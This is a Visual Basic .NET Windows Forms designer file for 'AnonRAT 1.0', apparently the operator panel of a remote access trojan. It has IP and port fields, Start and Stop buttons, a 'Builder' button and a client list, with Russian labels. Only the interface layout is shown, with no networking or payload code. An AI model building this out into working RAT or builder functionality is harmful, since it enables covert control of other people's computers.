<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class AnonRAT
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(AnonRAT))
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.txtIp = New System.Windows.Forms.TextBox()
        Me.txtPort = New System.Windows.Forms.TextBox()
        Me.btnStart = New System.Windows.Forms.Button()
        Me.btnStop = New System.Windows.Forms.Button()
        Me.builderBtn = New System.Windows.Forms.Button()
        Me.aboutBtn = New System.Windows.Forms.Button()
        Me.flowPanelClients = New System.Windows.Forms.FlowLayoutPanel()
        Me.SuspendLayout()
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel1.Location = New System.Drawing.Point(829, -3)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(1, 501)
        Me.Panel1.TabIndex = 0
        '
        'txtIp
        '
        Me.txtIp.Location = New System.Drawing.Point(837, 35)
        Me.txtIp.Name = "txtIp"
        Me.txtIp.Size = New System.Drawing.Size(100, 22)
        Me.txtIp.TabIndex = 1
        Me.txtIp.Text = "127.0.0.1"
        '
        'txtPort
        '
        Me.txtPort.Location = New System.Drawing.Point(837, 82)
        Me.txtPort.Name = "txtPort"
        Me.txtPort.Size = New System.Drawing.Size(100, 22)
        Me.txtPort.TabIndex = 2
        Me.txtPort.Text = "8888"
        '
        'btnStart
        '
        Me.btnStart.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnStart.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(204, Byte))
        Me.btnStart.Location = New System.Drawing.Point(837, 124)
        Me.btnStart.Name = "btnStart"
        Me.btnStart.Size = New System.Drawing.Size(100, 31)
        Me.btnStart.TabIndex = 3
        Me.btnStart.Text = "Старт"
        Me.btnStart.UseVisualStyleBackColor = True
        '
        'btnStop
        '
        Me.btnStop.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnStop.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(204, Byte))
        Me.btnStop.Location = New System.Drawing.Point(837, 167)
        Me.btnStop.Name = "btnStop"
        Me.btnStop.Size = New System.Drawing.Size(100, 31)
        Me.btnStop.TabIndex = 4
        Me.btnStop.Text = "Стоп"
        Me.btnStop.UseVisualStyleBackColor = True
        '
        'builderBtn
        '
        Me.builderBtn.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.builderBtn.Font = New System.Drawing.Font("Microsoft Sans Serif", 10.2!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(204, Byte))
        Me.builderBtn.Location = New System.Drawing.Point(837, 456)
        Me.builderBtn.Name = "builderBtn"
        Me.builderBtn.Size = New System.Drawing.Size(110, 31)
        Me.builderBtn.TabIndex = 6
        Me.builderBtn.Text = "Билдер"
        Me.builderBtn.UseVisualStyleBackColor = True
        '
        'aboutBtn
        '
        Me.aboutBtn.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.aboutBtn.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(204, Byte))
        Me.aboutBtn.Location = New System.Drawing.Point(837, 408)
        Me.aboutBtn.Name = "aboutBtn"
        Me.aboutBtn.Size = New System.Drawing.Size(110, 31)
        Me.aboutBtn.TabIndex = 7
        Me.aboutBtn.Text = "О нас"
        Me.aboutBtn.UseVisualStyleBackColor = True
        '
        'flowPanelClients
        '
        Me.flowPanelClients.BackColor = System.Drawing.Color.Transparent
        Me.flowPanelClients.Location = New System.Drawing.Point(0, -3)
        Me.flowPanelClients.Name = "flowPanelClients"
        Me.flowPanelClients.Size = New System.Drawing.Size(830, 501)
        Me.flowPanelClients.TabIndex = 8
        '
        'AnonRAT
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(8.0!, 16.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackgroundImage = Global.AnonRAT.My.Resources.Resources.backk
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.ClientSize = New System.Drawing.Size(959, 499)
        Me.Controls.Add(Me.flowPanelClients)
        Me.Controls.Add(Me.aboutBtn)
        Me.Controls.Add(Me.builderBtn)
        Me.Controls.Add(Me.btnStop)
        Me.Controls.Add(Me.btnStart)
        Me.Controls.Add(Me.txtPort)
        Me.Controls.Add(Me.txtIp)
        Me.Controls.Add(Me.Panel1)
        Me.DoubleBuffered = True
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "AnonRAT"
        Me.Text = "AnonRAT 1.0"
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents Panel1 As Panel
    Friend WithEvents txtIp As TextBox
    Friend WithEvents txtPort As TextBox
    Friend WithEvents btnStart As Button
    Friend WithEvents btnStop As Button
    Friend WithEvents builderBtn As Button
    Friend WithEvents aboutBtn As Button
    Friend WithEvents flowPanelClients As FlowLayoutPanel
End Class
